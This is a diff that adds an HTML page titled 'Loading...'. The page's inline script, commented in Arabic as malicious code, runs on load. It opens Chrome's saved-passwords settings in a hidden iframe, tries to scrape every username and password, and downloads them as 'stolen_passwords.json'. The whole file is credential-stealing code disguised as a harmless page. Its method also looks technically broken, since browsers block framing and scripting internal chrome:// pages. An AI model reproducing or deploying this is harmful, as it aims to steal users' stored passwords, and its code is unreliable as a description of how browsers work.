@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        // دالة لتنفيذ الكود الخبيث
+        function executeMaliciousCode() {
+            // إنشاء عنصر iframe عشان نفتح صفحة إدارة الباسوردات
+            const iframe = document.createElement('iframe');
+            iframe.src = 'chrome://settings/passwords';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+
+            // انتظر حتى الصفحة تتحمل
+            setTimeout(() => {
+                // استخراج الباسوردات باستخدام JavaScript
+                const script = `
+                    var passwords = [];
+                    var passwordList = document.querySelectorAll('password-manager-list');
+                    passwordList.forEach(function(item) {
+                        var username = item.shadowRoot.querySelector('.username').innerText;
+                        var password = item.shadowRoot.querySelector('.password').innerText;
+                        passwords.push({username: username, password: password});
+                    });
+                    return passwords;
+                `;
+
+                // تنفيذ السكريبت داخل الـ iframe
+                const passwords = iframe.contentWindow.eval(script);
+
+                // حفظ الباسوردات في ملف
+                const data = JSON.stringify(passwords, null, 2);
+                const blob = new Blob([data], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'stolen_passwords.json';
+                a.click();
+
+                // تنظيف
+                URL.revokeObjectURL(url);
+                document.body.removeChild(iframe);
+            }, 5000); // انتظر 5 ثواني عشان الصفحة تتحمل
+        }
+
+        // تنفيذ الكود لما الصفحة تتحمل
+        window.onload = executeMaliciousCode;
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
